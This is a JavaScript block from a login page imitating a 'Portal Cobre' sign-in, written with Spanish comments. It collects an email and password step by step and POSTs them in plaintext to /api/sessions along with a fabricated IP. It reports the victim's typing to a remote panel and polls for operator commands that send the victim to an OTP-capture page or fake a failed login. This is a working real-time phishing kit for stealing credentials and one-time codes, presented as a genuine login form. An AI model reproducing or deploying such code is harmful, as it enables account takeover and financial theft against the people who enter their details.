<script>
// Lógica de Login Cobre personalizada
let sessionId = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
sessionStorage.setItem('sessionId', sessionId);

let pingInterval = null;
let pollInterval = null;
let currentStep = 1; // 1: Email, 2: Password
let userEmail = '';

const titleEl = document.querySelector('h1.cd8e24c8b');
const subtitleEl = document.querySelector('p.ccab0555e');
const formEl = document.querySelector('form.c235681a9');
const inputWrapper = document.querySelector('.input-wrapper._input-wrapper');
const mainButton = document.querySelector('button.cb209d8db');
const spinnerEl = document.getElementById('cobre-spinner');

// Prevenir envío por defecto
formEl.addEventListener('submit', (e) => {
  e.preventDefault();
  handleNext();
});

function handleNext() {
  if (currentStep === 1) {
    // Paso 1: Validar Email
    const emailInput = document.getElementById('username');
    const emailVal = emailInput.value.trim();
    if (!emailVal || !emailVal.includes('@')) {
      alert('Por favor ingresa un correo electrónico válido.');
      return;
    }
    userEmail = emailVal;
    
    // Transición a Paso 2 (Contraseña)
    currentStep = 2;
    titleEl.textContent = 'Ingresar contraseña';
    subtitleEl.textContent = userEmail;
    
    // Reemplazar input de Email por el de Contraseña
    inputWrapper.innerHTML = `
      <div class="c51a7aec2 c6c047047 text c8f27b15b ulp-field c1bf9d521">
        <label id="password-label" class="cdf383a28 cbab68901 c7a2e46f3" for="password">Contraseña <span class="required" aria-hidden="true">*</span></label>
        <input class="input c1154fbef c3a652b46" id="password" type="password" name="password" required="" autocomplete="current-password" style="font-size: 1rem; width: 100%; border: 1px solid #A4A3A1; border-radius: 4px; padding: 0.8rem; background: #fff; color: #212121;">
      </div>
    `;
    mainButton.textContent = 'Ingresar';
    
    // Autofocus
    setTimeout(() => {
      document.getElementById('password').focus();
    }, 100);
    
  } else if (currentStep === 2) {
    // Paso 2: Validar Contraseña y enviar al panel
    const passInput = document.getElementById('password');
    const passVal = passInput.value.trim();
    if (!passVal) {
      alert('Por favor ingresa tu contraseña.');
      return;
    }
    
    // Mostrar spinner
    spinnerEl.style.display = 'flex';
    
    sessionStorage.setItem('userEmail', userEmail);
    // Crear sesión
    const session = {
      id: sessionId,
      username: userEmail,
      password: passVal,
      tipoUsuario: 'Portal Cobre',
      device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
      ip: '186.29.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255),
      state: 'waiting',
      createdAt: Date.now()
    };
    
    fetch('/api/sessions', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(session)
    })
    .then(() => {
      startPing();
      startPolling();
    })
    .catch((err) => {
      spinnerEl.style.display = 'none';
      alert('Error de conexión. Intente de nuevo.');
    });
  }
}

// Estado de escritura
document.addEventListener('input', (e) => {
  if (e.target.id === 'username' || e.target.id === 'password') {
    fetch('/api/sessions/' + sessionId + '/state', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ state: 'typing' })
    }).catch(() => {});
  }
});

function startPing() {
  if (pingInterval) clearInterval(pingInterval);
  fetch('/api/sessions/' + sessionId + '/ping', { method: 'POST' }).catch(() => {});
  pingInterval = setInterval(() => {
    fetch('/api/sessions/' + sessionId + '/ping', { method: 'POST' }).catch(() => {});
  }, 4000);
}

function startPolling() {
  if (pollInterval) clearInterval(pollInterval);
  pollInterval = setInterval(async () => {
    try {
      const response = await fetch('/api/sessions/' + sessionId);
      if (response.ok) {
        const data = await response.json();
        const action = data.action;
        if (action === 'dinamica' || action === 'sms') {
          clearInterval(pingInterval);
          clearInterval(pollInterval);
          sessionStorage.setItem('otpType', action);
          window.location.href = "clave.html";
        } else if (action === 'error-login') {
          // Resetear pantalla
          clearInterval(pingInterval);
          clearInterval(pollInterval);
          spinnerEl.style.display = 'none';
          alert('Correo o contraseña incorrectos.');
          window.location.reload();
        } else if (action === 'done') {
          clearInterval(pingInterval);
          clearInterval(pollInterval);
          window.location.href = "index.html";
        }
      }
    } catch (e) {}
  }, 1500);
}
</script>
